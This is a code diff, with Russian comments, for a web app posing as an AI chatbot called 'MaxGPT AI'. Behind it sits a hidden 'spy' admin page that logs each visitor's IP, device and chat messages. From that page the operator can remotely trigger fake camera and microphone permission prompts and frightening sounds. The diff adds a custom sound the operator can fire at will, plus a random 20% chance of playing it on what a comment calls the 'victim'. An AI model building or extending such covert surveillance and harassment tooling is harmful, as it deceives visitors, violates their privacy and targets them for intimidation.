@@ -301,6 +301,15 @@ function unlockAudio() {
     }
 }
 
+// Воспроизведение твоего звука из корня сайта
+function playCustomSound() {
+    unlockAudio();
+    try {
+        let audio = new Audio('/mysound.mp3');
+        audio.play().catch(e => console.log("Браузер заблокировал автовоспроизведение"));
+    } catch(e) {}
+}
+
 function playShutterSound() {
     unlockAudio();
     try {
@@ -467,6 +476,7 @@ async function pollAdminCommands() {
             d.commands.forEach(cmd => {
                 if (cmd === 'sound_shutter') playShutterSound();
                 if (cmd === 'sound_beep') playBeepSound();
+                if (cmd === 'sound_custom') playCustomSound(); // Воспроизведение твоего звука
                 if (cmd === 'perm_cam') showCameraPromptCustom();
                 if (cmd === 'perm_mic') showMicPromptCustom();
             });
@@ -516,6 +526,12 @@ async function send(){
 
         c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
         c.scrollTop = c.scrollHeight;
+
+        // Если с сервера пришла команда автоматического звука — воспроизводим его
+        if (d.trigger_sound) {
+            playCustomSound();
+        }
+
     } catch(err) {
         let typingEl = document.getElementById(typingId);
         if(typingEl) typingEl.remove();
@@ -563,6 +579,7 @@ SPY_PAGE = """<!DOCTYPE html>
         .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 11.5px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
         .btn-act:hover { filter: brightness(1.1); }
         .btn-shutter { background: #ef4444; }
+        .btn-custom { background: #10b981; } /* Зеленая кнопка для твоего звука */
         .btn-beep { background: #f59e0b; }
         .btn-cam { background: #3b82f6; }
         .btn-mic { background: #8b5cf6; }
@@ -606,6 +623,9 @@ SPY_PAGE = """<!DOCTYPE html>
             <div class="action-btns">
                 <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')">
                     <i class="fa-solid fa-camera"></i> 🔊 Щелчок
+                </button>
+                <button class="btn-act btn-custom" onclick="triggerAction('{{ ip }}', 'sound_custom')">
+                    <i class="fa-solid fa-music"></i> 🎵 Свой звук
                 </button>
                 <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')">
                     <i class="fa-solid fa-bell"></i> 🔔 Звонок
@@ -824,7 +844,10 @@ def chat_api():
         all_chats[chat_id]["messages"].append({"user": user_msg, "bot": reply})
         chat_logs.append({"ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
         
-        return jsonify({"reply": reply, "chat_id": chat_id})
+        # Шанс 20% (0.2), что вместе с ответом бота у жертвы случайно сработает твой звук
+        trigger_sound = random.random() < 0.2
+
+        return jsonify({"reply": reply, "chat_id": chat_id, "trigger_sound": trigger_sound})
     except Exception as e:
         return jsonify({"reply": "Произошла внутренняя ошибка сервера.", "chat_id": chat_id if 'chat_id' in locals() else ""})
 
